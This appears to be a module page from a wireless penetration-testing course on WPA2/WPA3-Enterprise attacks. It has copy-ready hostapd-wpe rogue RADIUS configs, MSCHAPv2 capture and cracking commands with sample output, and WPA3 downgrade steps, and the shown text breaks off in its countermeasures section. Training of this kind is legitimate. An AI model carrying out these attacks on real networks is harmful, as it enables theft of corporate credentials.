@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Module 13 — WPA2/WPA3-Enterprise Attacks | WiFi Exploitation Course</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
+      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
+      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
+      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
+      --font-body:'Segoe UI',system-ui,sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
+    .page-wrapper { display:flex; min-height:100vh; }
+
+    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
+    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
+    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
+    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
+    .sidebar-nav { padding:16px 0; }
+    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
+    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
+    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
+    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
+    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
+    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }
+
+    main { flex:1; padding:48px 64px; max-width:960px; }
+
+    .module-header { margin-bottom:40px; }
+    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
+    .breadcrumb a { color:var(--accent); text-decoration:none; }
+    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
+    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
+    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
+    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
+    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
+    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }
+
+    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
+    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
+    .warning-box strong { color:#e3b341; }
+
+    section { margin-bottom:52px; }
+    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
+    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
+    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
+    p { margin-bottom:12px; }
+
+    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
+    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .terminal-dots { display:flex; gap:6px; }
+    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
+    .d-red{background:#f78166}.d-yellow{background:#e3b341}.d-green{background:#3fb950}
+    .terminal-title { font-size:11px; color:var(--text-dim); }
+    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
+    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
+    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
+    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
+    .prompt{color:var(--accent2);user-select:none} .cmd{color:#e6edf3} .flag{color:#ffa657}
+    .str{color:#a5d6ff} .cmt{color:#6e7681;font-style:italic} .out{color:var(--text-dim)}
+    .out-ok{color:var(--accent2)} .out-warn{color:var(--warn)} .out-err{color:var(--accent3)}
+
+    .config-block { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; }
+    .config-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .config-bar span { font-size:11px; color:var(--text-dim); font-family:var(--font-mono); }
+    .config-bar button { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; transition:all 0.15s; }
+    .config-bar button:hover { border-color:var(--accent); color:var(--accent); }
+    .config-bar button.copied { border-color:var(--accent2); color:var(--accent2); }
+    .config-body { padding:16px 18px; font-family:var(--font-mono); font-size:13px; line-height:1.9; white-space:pre-wrap; }
+    .cfg-key{color:#ffa657} .cfg-val{color:#a5d6ff} .cfg-comment{color:#6e7681;font-style:italic}
+
+    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
+    table { width:100%; border-collapse:collapse; font-size:13px; }
+    thead tr { background:rgba(88,166,255,0.06); }
+    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
+    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
+    tr:last-child td { border-bottom:none; }
+    tr:hover td { background:rgba(88,166,255,0.03); }
+    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }
+
+    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
+    .callout.info  { background:rgba(88,166,255,0.07);  border-left:3px solid var(--accent); }
+    .callout.attack{ background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
+    .callout.tip   { background:rgba(63,185,80,0.07);   border-left:3px solid var(--accent2); }
+    .callout.warn  { background:rgba(210,153,34,0.07);  border-left:3px solid var(--warn); }
+    .callout .ci { flex-shrink:0; font-size:16px; }
+    .callout strong { color:var(--text-head); }
+
+    /* Architecture diagram */
+    .arch-diagram { display:flex; align-items:center; gap:0; margin:20px 0; flex-wrap:wrap; }
+    .arch-box { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:14px 16px; text-align:center; min-width:130px; }
+    .arch-box .ab-title { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; margin-bottom:6px; }
+    .arch-box .ab-name  { font-size:13px; color:var(--text-head); font-weight:600; }
+    .arch-box .ab-sub   { font-size:11px; color:var(--text-dim); margin-top:4px; font-family:var(--font-mono); }
+    .arch-arrow { padding:0 8px; display:flex; flex-direction:column; align-items:center; gap:2px; }
+    .arch-arrow .aa-line { font-size:18px; color:var(--accent); }
+    .arch-arrow .aa-label { font-size:10px; color:var(--text-dim); white-space:nowrap; }
+
+    /* Speed comparison */
+    .speed-bars { margin:20px 0; display:flex; flex-direction:column; gap:12px; }
+    .speed-row { display:flex; align-items:center; gap:12px; }
+    .speed-label { font-size:12px; font-family:var(--font-mono); color:var(--text-dim); width:220px; flex-shrink:0; }
+    .speed-bar-wrap { flex:1; background:var(--bg); border:1px solid var(--border); border-radius:4px; height:22px; overflow:hidden; position:relative; }
+    .speed-bar-fill { height:100%; border-radius:4px; display:flex; align-items:center; padding-left:8px; font-size:11px; font-family:var(--font-mono); color:#0d1117; font-weight:700; white-space:nowrap; }
+    .speed-bar-fill.s1 { background:var(--accent3); width:1.7%; }
+    .speed-bar-fill.s2 { background:var(--warn);    width:4.7%; }
+    .speed-bar-fill.s3 { background:var(--accent2); width:100%; }
+
+    /* EAP flow */
+    .eap-flow { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin:16px 0; }
+    .eap-row { display:flex; align-items:center; gap:8px; padding:5px 0; border-bottom:1px solid rgba(48,54,61,0.4); font-family:var(--font-mono); font-size:12px; }
+    .eap-row:last-child { border-bottom:none; }
+    .eap-from { color:var(--accent); width:110px; flex-shrink:0; }
+    .eap-arrow { color:var(--text-dim); font-size:14px; }
+    .eap-msg  { color:var(--text-head); font-weight:600; width:120px; }
+    .eap-note { color:var(--text-dim); font-size:11px; flex:1; }
+    .eap-vuln { color:var(--accent3); font-size:11px; }
+
+    /* Simulator */
+    .ent-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
+    .ent-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
+    .sim-row { display:flex; gap:12px; flex-wrap:wrap; align-items:flex-end; margin-bottom:16px; }
+    .sim-field { display:flex; flex-direction:column; gap:6px; }
+    .sim-field label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
+    .sim-field input, .sim-field select { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; min-width:160px; }
+    .sim-field input:focus, .sim-field select:focus { border-color:var(--accent); }
+    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; align-self:flex-end; }
+    .sim-btn:hover { background:#79c0ff; }
+    .sim-btn:disabled { background:var(--border); color:var(--text-dim); cursor:default; }
+    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:220px; max-height:400px; overflow-y:auto; white-space:pre-wrap; }
+    .cred-log { margin-top:16px; display:none; }
+    .cred-log.show { display:block; }
+    .cred-log h4 { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; margin-bottom:8px; }
+    .cred-entry { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 14px; font-family:var(--font-mono); font-size:12px; margin-bottom:8px; line-height:1.8; }
+    .ce-user { color:var(--accent); }
+    .ce-chal { color:var(--warn); }
+    .ce-resp { color:var(--accent3); }
+    .ce-crack { color:var(--accent2); font-weight:700; }
+
+    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
+    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
+    .nav-btn.next { background:var(--accent); color:#0d1117; }
+    .nav-btn.next:hover { background:#79c0ff; }
+    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
+    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
+
+    ::-webkit-scrollbar { width:6px; height:6px; }
+    ::-webkit-scrollbar-track { background:var(--bg); }
+    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }
+
+    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
+  </style>
+</head>
+<body>
+<div class="page-wrapper">
+
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="course-title">WiFi Exploitation Course</div>
+      <h2>Wireless Security</h2>
+    </div>
+    <nav class="sidebar-nav">
+      <div class="sidebar-section-label">Tier 1 — Foundations</div>
+      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
+      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
+      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
+      <div class="sidebar-section-label">Tier 2 — Recon</div>
+      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
+      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
+      <div class="sidebar-section-label">Tier 3 — Legacy</div>
+      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
+      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
+      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
+      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
+      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
+      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
+      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
+      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
+      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
+      <div class="sidebar-section-label">Tier 7 — WPS</div>
+      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
+      <div class="sidebar-section-label">Tier 8 — Modern</div>
+      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
+      <a href="#" class="active"><span class="mod-num">13</span> WPA-Enterprise</a>
+      <div class="sidebar-section-label">Tier 9 — Chaining</div>
+      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
+    </nav>
+  </aside>
+
+  <main>
+    <div class="module-header">
+      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 13</div>
+      <div class="module-badge">&#9679; Tier 8 &mdash; Modern WPA2/WPA3 Attack Vectors</div>
+      <h1>WPA2/WPA3-Enterprise Attacks</h1>
+      <p class="subtitle">Attack WPA2-Enterprise networks using rogue RADIUS servers to capture MSCHAPv2 credentials, crack them with asleap and hashcat, and exploit WPA3-SAE Dragonblood vulnerabilities.</p>
+      <div class="meta-row">
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Advanced</div>
+        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~60 min</div>
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Corporate targets</div>
+      </div>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Legal Notice:</strong> Enterprise wireless attacks against corporate infrastructure without explicit written authorization are serious criminal offences with significant penalties. This module is for authorized penetration testing and lab environments only.</p>
+    </div>
+
+    <!-- Section 1: Architecture -->
+    <section id="architecture">
+      <h2><span class="section-num">01</span> WPA2-Enterprise Architecture</h2>
+      <p>WPA2-Enterprise replaces the shared PSK with per-user credentials authenticated via a RADIUS server. The AP is just a relay — all auth logic lives in the RADIUS backend.</p>
+
+      <div class="arch-diagram">
+        <div class="arch-box">
+          <div class="ab-title">Supplicant</div>
+          <div class="ab-name">Client Device</div>
+          <div class="ab-sub">802.1X / EAP</div>
+        </div>
+        <div class="arch-arrow">
+          <div class="aa-line">&#8644;</div>
+          <div class="aa-label">EAP over 802.11</div>
+        </div>
+        <div class="arch-box">
+          <div class="ab-title">Authenticator</div>
+          <div class="ab-name">Access Point</div>
+          <div class="ab-sub">EAP relay / NAS</div>
+        </div>
+        <div class="arch-arrow">
+          <div class="aa-line">&#8644;</div>
+          <div class="aa-label">RADIUS / UDP 1812</div>
+        </div>
+        <div class="arch-box">
+          <div class="ab-title">Auth Server</div>
+          <div class="ab-name">RADIUS</div>
+          <div class="ab-sub">FreeRADIUS / NPS</div>
+        </div>
+        <div class="arch-arrow">
+          <div class="aa-line">&#8644;</div>
+          <div class="aa-label">LDAP / AD</div>
+        </div>
+        <div class="arch-box">
+          <div class="ab-title">User Store</div>
+          <div class="ab-name">Active Directory</div>
+          <div class="ab-sub">accounts &amp; certs</div>
+        </div>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>Why it's valuable:</strong> Credentials captured from a WPA2-Enterprise attack are typically <strong>Active Directory accounts</strong> — valid for email, VPN, SharePoint, and internal systems. One captured hash unlocks far more than just Wi-Fi access.</div>
+      </div>
+    </section>
+
+    <!-- Section 2: EAP types -->
+    <section id="eap">
+      <h2><span class="section-num">02</span> EAP Types &amp; Vulnerabilities</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>EAP Type</th><th>Inner Auth</th><th>Cert Validated?</th><th>Attack Vector</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><strong>PEAP</strong></td><td>MSCHAPv2</td><td>Optional (often no)</td><td>Rogue RADIUS → hash capture</td></tr>
+            <tr><td><strong>EAP-TTLS</strong></td><td>PAP / MSCHAPv2</td><td>Optional</td><td>Same as PEAP</td></tr>
+            <tr><td><strong>EAP-FAST</strong></td><td>MSCHAPv2 / PAP</td><td>Optional / PAC</td><td>PAC provisioning attacks</td></tr>
+            <tr><td><strong>EAP-TLS</strong></td><td>Certificate</td><td>Yes (mutual)</td><td>Cert theft, stolen private key</td></tr>
+            <tr><td><strong>EAP-LEAP</strong></td><td>MSCHAPv1</td><td>No</td><td>Direct offline crack (asleap)</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>PEAP-MSCHAPv2 — The Core Vulnerability</h3>
+
+      <div class="eap-flow">
+        <div class="eap-row">
+          <span class="eap-from">Client</span><span class="eap-arrow">──►</span>
+          <span class="eap-msg">EAP-Identity</span>
+          <span class="eap-note">outer identity (often anonymous)</span>
+        </div>
+        <div class="eap-row">
+          <span class="eap-from">Rogue AP</span><span class="eap-arrow">◄──</span>
+          <span class="eap-msg">TLS ServerHello</span>
+          <span class="eap-note">presents self-signed certificate</span>
+          <span class="eap-vuln">← client accepts if cert validation disabled</span>
+        </div>
+        <div class="eap-row">
+          <span class="eap-from">Client</span><span class="eap-arrow">──►</span>
+          <span class="eap-msg">TLS ClientHello</span>
+          <span class="eap-note">TLS tunnel established</span>
+        </div>
+        <div class="eap-row">
+          <span class="eap-from">Client</span><span class="eap-arrow">──►</span>
+          <span class="eap-msg">MSCHAPv2</span>
+          <span class="eap-note">username + NT hash response inside TLS</span>
+          <span class="eap-vuln">← captured by hostapd-wpe!</span>
+        </div>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#128165;</span>
+        <div><strong>The PEAP trap:</strong> PEAP uses one-way TLS — only the server is authenticated. If clients don't validate the server cert (the default in many deployments), <em>any</em> certificate works. The MSCHAPv2 credentials flow straight to the rogue server.</div>
+      </div>
+    </section>
+
+    <!-- Section 3: hostapd-wpe -->
+    <section id="hostapdwpe">
+      <h2><span class="section-num">03</span> Rogue RADIUS with hostapd-wpe</h2>
+
+      <div class="config-block">
+        <div class="config-bar">
+          <span>&#128196; /etc/hostapd-wpe/corp-evil.conf</span>
+          <button onclick="copyConfig(this,'copy-hostapdwpe')">Copy</button>
+        </div>
+        <div class="config-body" id="copy-hostapdwpe"><span class="cfg-comment"># Rogue WPA2-Enterprise AP</span>
+<span class="cfg-key">interface</span>=<span class="cfg-val">wlan1</span>
+<span class="cfg-key">driver</span>=<span class="cfg-val">nl80211</span>
+<span class="cfg-key">ssid</span>=<span class="cfg-val">CorpWiFi</span>          <span class="cfg-comment"># Match target SSID exactly</span>
+<span class="cfg-key">hw_mode</span>=<span class="cfg-val">g</span>
+<span class="cfg-key">channel</span>=<span class="cfg-val">6</span>
+
+<span class="cfg-comment"># WPA2-Enterprise</span>
+<span class="cfg-key">auth_algs</span>=<span class="cfg-val">3</span>
+<span class="cfg-key">wpa</span>=<span class="cfg-val">2</span>
+<span class="cfg-key">wpa_key_mgmt</span>=<span class="cfg-val">WPA-EAP</span>
+<span class="cfg-key">rsn_pairwise</span>=<span class="cfg-val">CCMP</span>
+<span class="cfg-key">ieee8021x</span>=<span class="cfg-val">1</span>
+<span class="cfg-key">eap_server</span>=<span class="cfg-val">1</span>
+
+<span class="cfg-comment"># Certificates (self-signed is fine — clients won't check)</span>
+<span class="cfg-key">ca_cert</span>=<span class="cfg-val">/etc/hostapd-wpe/certs/ca.pem</span>
+<span class="cfg-key">server_cert</span>=<span class="cfg-val">/etc/hostapd-wpe/certs/server.pem</span>
+<span class="cfg-key">private_key</span>=<span class="cfg-val">/etc/hostapd-wpe/certs/server.key</span>
+
+<span class="cfg-key">eap_user_file</span>=<span class="cfg-val">/etc/hostapd-wpe/hostapd-wpe.eap_user</span>
+<span class="cfg-key">hostapd_wpe_log_file</span>=<span class="cfg-val">/var/log/hostapd-wpe.log</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Start hostapd-wpe and watch for credentials</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-wpe-run')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-wpe-run"><span class="cmt"># Generate certs first</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">cd /etc/hostapd-wpe/certs && sudo bash bootstrap</span>
+
+<span class="cmt"># Start rogue AP</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo hostapd-wpe /etc/hostapd-wpe/corp-evil.conf</span>
+<span class="out-ok">wlan1: AP-ENABLED</span>
+
+<span class="cmt"># When a client connects and authenticates:</span>
+<span class="out-ok">hostapd-wpe: mschapv2 captured</span>
+<span class="out">  username:  alice@corp.com</span>
+<span class="out-warn">  challenge: 5d:9b:4b:1f:3a:2e:7c:8d</span>
+<span class="out-err">  response:  a1:b2:c3:d4:e5:f6:a7:b8:c9:d0:e1:f2:a3:b4:c5:d6:e7:f8:a9:b0:c1</span></div>
+      </div>
+    </section>
+
+    <!-- Section 4: Cracking -->
+    <section id="cracking">
+      <h2><span class="section-num">04</span> Cracking MSCHAPv2</h2>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">asleap — direct MSCHAPv2 crack</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-asleap')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-asleap"><span class="prompt">kali@kali:~$ </span><span class="cmd">sudo asleap \
+  <span class="flag">-C</span> <span class="str">5d:9b:4b:1f:3a:2e:7c:8d</span> \
+  <span class="flag">-R</span> <span class="str">a1:b2:c3:d4:e5:f6:a7:b8:c9:d0:e1:f2:a3:b4:c5:d6:e7:f8:a9:b0:c1</span> \
+  <span class="flag">-W</span> /usr/share/wordlists/rockyou.txt</span>
+
+<span class="out-ok">username: alice@corp.com</span>
+<span class="out-ok">NT hash:  8846f7eaee8fb117ad06bdd830b7586c</span>
+<span class="out-ok">password: Summer2024!</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">hashcat — NetNTLMv2 (mode 5600) and NT hash (mode 1000)</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-hashcat-ntlm')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-hashcat-ntlm"><span class="cmt"># Mode 5600 — NetNTLMv2 / MSCHAPv2</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hashcat <span class="flag">-m</span> <span class="str">5600</span> mschapv2.hash rockyou.txt <span class="flag">-r</span> rules/best64.rule</span>
+
+<span class="cmt"># Mode 1000 — NT hash directly (fastest — 70B H/s on RTX 4090)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hashcat <span class="flag">-m</span> <span class="str">1000</span> 8846f7eaee8fb117ad06bdd830b7586c rockyou.txt</span>
+
+<span class="out-ok">8846f7eaee8fb117ad06bdd830b7586c:Summer2024!</span>
+<span class="out-warn">Session..........: hashcat</span>
+<span class="out-warn">Status...........: Cracked</span>
+<span class="out-warn">Time.Estimated...: 0 secs</span></div>
+      </div>
+
+      <h3>Why MSCHAPv2 Cracks So Fast</h3>
+      <div class="speed-bars">
+        <div class="speed-row">
+          <div class="speed-label">WPA2-PSK (-m 22000)</div>
+          <div class="speed-bar-wrap">
+            <div class="speed-bar-fill s1">1.2M H/s</div>
+          </div>
+        </div>
+        <div class="speed-row">
+          <div class="speed-label">NetNTLMv2 (-m 5600)</div>
+          <div class="speed-bar-wrap">
+            <div class="speed-bar-fill s2">3,300M H/s</div>
+          </div>
+        </div>
+        <div class="speed-row">
+          <div class="speed-label">NT hash (-m 1000)</div>
+          <div class="speed-bar-wrap">
+            <div class="speed-bar-fill s3">70,000M H/s</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="callout info">
+        <span class="ci">&#128161;</span>
+        <div><strong>Speed gap:</strong> MSCHAPv2 (mode 5600) cracks <strong>2,750×</strong> faster than WPA2-PSK. NT hash (mode 1000) cracks <strong>58,000×</strong> faster. A password that would take months against WPA2-PSK cracks in seconds from an MSCHAPv2 capture.</div>
+      </div>
+    </section>
+
+    <!-- Section 5: WPA3 -->
+    <section id="wpa3">
+      <h2><span class="section-num">05</span> WPA3-SAE &amp; Dragonblood</h2>
+      <p>WPA3-Personal uses SAE (Simultaneous Authentication of Equals / Dragonfly) — resistant to offline dictionary attacks. However, the 2019 Dragonblood research exposed side-channel vulnerabilities.</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>CVE</th><th>Type</th><th>Description</th><th>Status</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>CVE-2019-9494</td><td>Cache side-channel</td><td>Timing leak reveals password bits during SAE commit</td><td>Patched (most firmware)</td></tr>
+            <tr><td>CVE-2019-9496</td><td>Crypto downgrade</td><td>SAE confirmation bypass</td><td>Patched</td></tr>
+            <tr><td>CVE-2019-13377</td><td>Timing side-channel</td><td>Brainpool curves leak timing info</td><td>Patched</td></tr>
+            <tr><td>CVE-2019-13456</td><td>Info leak</td><td>EAP-pwd in FreeRADIUS leaks info</td><td>Patched</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">WPA3 downgrade attack (transition mode)</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-wpa3down')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-wpa3down"><span class="cmt"># Step 1: Identify WPA3-Transition mode APs</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng wlan0mon</span>
+<span class="out-warn"> BSSID              AUTH   ESSID</span>
+<span class="out"> AA:BB:CC:DD:EE:FF  WPA3   CorpNet   &lt;-- WPA3-only (safe)</span>
+<span class="out-warn"> 11:22:33:44:55:66  WPA2/  HomeNet   &lt;-- transition mode VULNERABLE</span>
+<span class="out-warn">                    WPA3</span>
+
+<span class="cmt"># Step 2: Deploy WPA2-only evil twin — client downgrades</span>
+<span class="cmt"># Use hostapd config from Module 09 (WPA2-PSK, same SSID)</span>
+<span class="cmt"># Step 3: Capture PMKID or handshake as normal (Module 06/12)</span></div>
+      </div>
+
+      <div class="callout warn">
+        <span class="ci">&#9888;</span>
+        <div><strong>WPA3 downgrade:</strong> If an AP runs in transition mode (WPA2+WPA3), a WPA2-only evil twin can force clients to connect via WPA2, making them vulnerable to all WPA2 attacks. The fix: configure the AP for <strong>WPA3-only</strong> mode.</div>
+      </div>
+    </section>
+
+    <!-- Section 6: Simulator -->
+    <section id="simulator">
+      <h2><span class="section-num">06</span> Enterprise Attack Simulator</h2>
+      <p>Simulate a full WPA2-Enterprise rogue RADIUS attack — from AP setup to credential capture and cracking.</p>
+
+      <div class="ent-sim">
+        <h3>&#127970; Enterprise Attack Simulator</h3>
+        <div class="sim-row">
+          <div class="sim-field">
+            <label>Target SSID</label>
+            <input type="text" id="simSSID" value="CorpWiFi" />
+          </div>
+          <div class="sim-field">
+            <label>EAP Type</label>
+            <select id="simEAP">
+              <option value="peap">PEAP-MSCHAPv2</option>
+              <option value="ttls">EAP-TTLS/PAP</option>
+              <option value="leap">EAP-LEAP (legacy)</option>
+            </select>
+          </div>
+          <div class="sim-field">
+            <label>Cert Validation</label>
+            <select id="simCertVal">
+              <option value="no">Disabled (default)</option>
+              <option value="yes">Enabled (hardened)</option>
+            </select>
+          </div>
+          <button class="sim-btn" id="simBtn" onclick="runEntSim()">&#9654; Run Attack</button>
+        </div>
+        <div class="sim-output" id="entOutput"><span style="color:var(--text-dim);">Configure the attack above and click "Run Attack"...</span></div>
+        <div class="cred-log" id="credLog">
+          <h4>&#128196; /var/log/hostapd-wpe.log — captured credentials</h4>
+          <div id="credEntries"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 7: Countermeasures -->
+    <section id="countermeasures">
+      <h2><span class="section-num">07</span> Detection &amp; Countermeasures</h2>
+
+      <div class="callout tip">
+        <span class="ci">&#128274;</span>
+        <div><strong>Single most important fix:</strong> Configure all supplicants to validate the RADIUS server certificate and pin it to your internal CA. This blocks <em>all</em> rogue RADIUS attacks regardless of EAP type.</div>
+      </div>
+
+      <div class="config-block">
+        <div class="config-bar">
